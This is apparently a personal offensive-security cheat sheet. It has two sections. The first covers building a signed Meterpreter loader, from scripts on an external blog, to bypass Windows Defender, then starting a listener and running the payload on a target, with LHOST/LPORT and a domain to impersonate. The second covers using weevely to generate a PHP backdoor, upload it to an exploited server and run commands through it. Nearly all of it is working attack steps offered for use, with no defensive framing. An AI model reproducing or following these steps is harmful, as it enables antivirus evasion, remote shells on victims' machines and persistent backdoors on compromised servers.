# PrivEsc on Windows
## Bypassing Windows Defender
There're a [usefull scripts](https://astr0baby.wordpress.com/2019/01/26/custom-meterpreter-loader-in-2019/), from **Astr0baby's blog**, just copy-paste them. 

**NOTE:** There're some replaces needed in the listener.sh script:

1. *Line 12:* remove the ./ from the call to msfconsole
2. *Line 16:* add -job after the run sentence

```bash
./msf-loader.sh
# introduce LHOST
# introduce LPORT
# domain to impersonate?
# The process should have created a 'payload.exe' and also 'payload-signed.exe'
./listener.sh
# Define the LHOST
# Define the LPORT
# Now the payload shall be ran into the target
```

# WebApplication Hacking
## Create a PHP Backdoor shell
The software named **weevely** will help on this matter. It's a software that crates the php file to upload to the exploited
server.

```bash
# Generate new agent
weevely generate <password> <path>
# Run terminal or command on the target
weevely <URL> <password> [cmd]
# Recover an existing session
weevely session <path> [cmd]
```
